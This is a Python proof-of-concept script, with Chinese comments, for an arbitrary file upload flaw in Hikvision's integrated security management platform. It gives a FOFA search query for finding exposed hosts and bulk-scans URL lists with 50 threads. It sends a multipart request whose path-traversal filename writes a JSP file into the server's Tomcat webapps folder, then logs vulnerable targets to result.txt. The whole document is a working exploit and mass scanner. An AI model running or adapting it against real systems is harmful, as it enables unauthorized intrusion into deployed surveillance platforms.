# HiKVISION综合安防管理平台report任意文件上传漏洞
import argparse,requests,sys,time,re,json
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# app="HIKVISION-综合安防管理平台"

def banner():
    test = """
"""
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='HiKVISION综合安防管理平台report任意文件上传漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_payload = "/svm/api/external/report"
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2227.0Safari/537.36',
        'Content-Type':'multipart/form-data;boundary=----WebKitFormBoundarykcerblvm'
    }
    data = '------WebKitFormBoundarykcerblvm\r\nContent-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/mctc.jsp"\r\nContent-Type: application/zip\r\n\r\n123\r\n\r\n------WebKitFormBoundarykcerblvm--'
    try:
        response = requests.post(url=target+api_payload,headers=headers,data=data,verify=False,timeout=10)
        path = "/portal/ui/login/..;/..;/mctc.jsp"
        content = json.loads(response.text)
        if response.status_code == 200 and content['code'] == '0x26e31402':
            print(f"[+]{target} 存在文件上传漏洞\n文件上传的路径为:{target}{path}")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在文件上传漏洞")
    except:
        print(f"[x]{target} 该站点无法访问")


if __name__ == '__main__':
    main()